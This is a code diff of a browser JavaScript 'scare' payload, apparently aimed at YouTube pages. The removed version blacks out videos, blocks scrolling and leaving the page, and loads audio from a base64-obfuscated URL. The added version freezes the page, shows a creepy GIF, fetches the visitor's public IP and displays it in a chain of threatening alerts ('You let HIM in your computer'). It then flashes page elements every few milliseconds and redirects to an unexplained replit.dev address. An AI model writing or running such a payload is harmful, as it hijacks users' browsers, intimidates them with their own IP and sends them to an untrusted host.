@@ -1,78 +1,84 @@
-(function() {
-    // Select videos
-    const videos = document.querySelectorAll('.video-stream.html5-main-video');
-    if (!videos.length) return;
+(async () => {
+    // Pause all videos
+    document.querySelectorAll('video').forEach(v => v.pause());
 
-    // Stop, mute, and black them
-    videos.forEach(v => {
-        v.pause();
-        v.muted = true;
-        v.style.filter = "brightness(0)";
-    });
+    // Freeze page interactions
+    document.body.style.pointerEvents = 'none';
+    document.body.style.userSelect = 'none';
 
-    // Prevent scroll and navigation
-    function blockEvents(e) { e.preventDefault(); e.stopPropagation(); return false; }
-    window.addEventListener("scroll", blockEvents, { passive: false });
-    window.addEventListener("beforeunload", e => { e.preventDefault(); e.returnValue = ""; });
-
-    // Overlay container (for image + final black screen)
-    const overlay = document.createElement("div");
-    overlay.style.position = "fixed";
-    overlay.style.top = 0;
-    overlay.style.left = 0;
-    overlay.style.width = "100%";
-    overlay.style.height = "100%";
-    overlay.style.display = "flex";
-    overlay.style.alignItems = "center";
-    overlay.style.justifyContent = "center";
-    overlay.style.background = "transparent";
-    overlay.style.zIndex = "999999";
+    // Black overlay
+    const overlay = document.createElement('div');
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:black;z-index:9999;';
     document.body.appendChild(overlay);
 
-    // Image element (starts invisible)
-    const img = document.createElement("img");
-    img.src = "https://media.tenor.com/S4IgNAEu0UAAAAAM/creepy.gif";
-    img.style.maxWidth = "60%";
-    img.style.maxHeight = "60%";
-    img.style.opacity = "0";
-    img.style.transition = "opacity 2s";
-    overlay.appendChild(img);
+    // Creepy GIF
+    const gif = document.createElement('img');
+    gif.src = 'https://media.tenor.com/S4IgNAEu0UAAAAAM/creepy.gif';
+    gif.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);cursor:pointer;z-index:10000;';
+    overlay.appendChild(gif);
 
-    // Ambience sound
-    const audio = new Audio(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9Zb3V0dWJlSmF2YXNjcmlwdFVsdGltYXRlL3JlZnMvaGVhZHMvbWFpbi8=')+'creepster.wav');
-    audio.loop = true;
+    // Corrupt GIF on click
+    gif.addEventListener('click', () => {
+        gif.src = Array.from(gif.src).reverse().join('');
+    });
 
-    // After 10s: show image + play ambience
+    // First alerts after 5 seconds
+    setTimeout(async () => {
+        // Fetch public IP
+        const fetched = await fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => data.ip);
+
+        const messages = [
+            "Consoquences",
+            "Consoquences that are Serious",
+            "Do you have any idea what you have done",
+            "You let HIM in your computer",
+            "And you are fucked up,",
+            fetched
+        ];
+
+        for (const msg of messages) await new Promise(resolve => { alert(msg); resolve(); });
+
+        // Play sound
+        const audio = new Audio('https://github.com/ivorydevrimoalt/YoutubeJavascriptUltimate/raw/refs/heads/main/creepster.wav');
+        audio.play();
+
+        // Additional alert sequence after sound
+        const moreAlerts = [
+            "It never ends...",
+            "You should have left now.",
+            "He is inside.",
+            "You cannot escape.",
+            "Do you feel it?",
+            "Your screen is cursed."
+        ];
+
+        for (const msg of moreAlerts) await new Promise(resolve => { alert(msg); resolve(); });
+
+    }, 5000);
+
+    // Start continuous chaos after 15 seconds
     setTimeout(() => {
-        img.style.opacity = "1";
-        audio.play().catch(()=>{});
-    }, 10000);
+        const elements = document.querySelectorAll('a, span, h1, h2, h3, h4, h5, h6, p, div, li, button');
 
-    // After 15s: start zoom effect
-    setTimeout(() => {
-        img.style.transition = "transform 20s linear, opacity 2s";
-        img.style.transform = "scale(2)";
+        const chaosInterval = setInterval(() => {
+            elements.forEach(el => {
+                el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                el.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                const scale = Math.random() * 2 + 0.5;
+                const rotate = Math.random() * 360;
+                const skewX = Math.random() * 60 - 30;
+                const skewY = Math.random() * 60 - 30;
+                el.style.transform = `scale(${scale}) rotate(${rotate}deg) skew(${skewX}deg, ${skewY}deg)`;
+                el.style.fontSize = `${Math.random() * 40 + 10}px`;
+            });
+        }, 4); // every 4 milliseconds
+
+        // Redirect 5 seconds after chaos starts
+        setTimeout(() => {
+            clearInterval(chaosInterval); // stop chaos before redirect
+            window.location.href = "https://5350e3cc-8969-43ab-bac1-ede7758d636d-00-18wgrshg6l4lg.janeway.replit.dev";
+        }, 5000); // 5 seconds after chaos starts
     }, 15000);
-
-    // After 25s: big black fullscreen box with centered image
-    setTimeout(() => {
-        audio.pause();
-        audio.src = "";
-
-        overlay.style.background = "black";
-        overlay.innerHTML = ""; // clear old children safely
-        overlay.style.justifyContent = "center";
-        overlay.style.alignItems = "center";
-
-        const finalImg = document.createElement("img");
-        finalImg.src = "https://media.tenor.com/S4IgNAEu0UAAAAAM/creepy.gif";
-        finalImg.style.maxWidth = "70%";
-        finalImg.style.maxHeight = "70%";
-        overlay.appendChild(finalImg);
-
-        // Try fullscreen
-        if (overlay.requestFullscreen) {
-            overlay.requestFullscreen().catch(()=>{});
-        }
-    }, 25000);
 })();
